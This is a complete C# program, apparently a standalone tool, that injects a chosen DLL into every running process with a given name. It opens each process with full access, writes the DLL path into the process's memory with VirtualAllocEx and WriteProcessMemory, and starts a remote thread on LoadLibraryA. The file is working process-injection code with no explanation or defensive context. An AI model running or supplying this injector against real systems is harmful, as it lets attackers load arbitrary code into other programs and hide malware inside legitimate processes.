using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;

using HWND = System.UIntPtr;
using HANDLE = System.UIntPtr;
using HMODULE = System.UIntPtr;

namespace DllInjection{
    class Program{
        [DllImport("kernel32.dll")]
        static extern HANDLE OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32.dll")]
        static extern HMODULE GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(HMODULE hModule, string lpProcName);
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(HANDLE hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(HANDLE hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(HANDLE hProcess,IntPtr lpThreadAttributes, uint dwStackSize, 
                                                IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        // privileges used for OpenProcess
        protected const uint PROCESS_ALL_ACCESS = PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | 
                    PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | 
                    PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_INFORMATION | 
                    PROCESS_SET_QUOTA | PROCESS_SUSPEND_RESUME | PROCESS_TERMINATE | 
                    PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | SYNCHRONIZE;
        protected const uint PROCESS_CREATE_PROCESS = 0x80;
        protected const uint PROCESS_CREATE_THREAD = 0x2;
        protected const uint PROCESS_DUP_HANDLE = 0x40;
        protected const uint PROCESS_QUERY_INFORMATION = 0x400;
        protected const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        protected const uint PROCESS_SET_INFORMATION = 0x200;
        protected const uint PROCESS_SET_QUOTA = 0x100;
        protected const uint PROCESS_SUSPEND_RESUME = 0x800;
        protected const uint PROCESS_TERMINATE = 0x1;
        protected const uint PROCESS_VM_OPERATION = 0x8;
        protected const uint PROCESS_VM_READ = 0x10;
        protected const uint PROCESS_VM_WRITE = 0x20;
        protected const uint SYNCHRONIZE = 0x100000;

        // used for VirtualAllocEx
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;

        static Process[] getProcess(string processName){
            Process[] process = new Process[0];
            try{
                process = Process.GetProcessesByName(processName);
            }
            catch(System.IndexOutOfRangeException e){
                Console.WriteLine(e.Message);
            }
            return process;
        }
        static void Main(string[] args){
            if(args.Length != 2){
                Console.WriteLine("Used args!! injection.exe [ProcessName] [dllPath]");
            }
            else{
                string processName = args[0];
                string dllPath = args[1];
                Process[] targetProcess = getProcess(processName);
                List<HANDLE> processHandle = new List<HANDLE>();

                foreach(var process in targetProcess){
                    processHandle.Add(OpenProcess(PROCESS_ALL_ACCESS, false, (uint)process.Id));
                }
                
                IntPtr loadLibrary = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                
                foreach(HANDLE handle in processHandle){
                    IntPtr allocMemAddr = VirtualAllocEx(handle, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    WriteProcessMemory(handle, allocMemAddr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out var bytesWritten);
                    CreateRemoteThread(handle, IntPtr.Zero, 0, loadLibrary, allocMemAddr, 0, IntPtr.Zero);
                }
            }
        }
    }
}
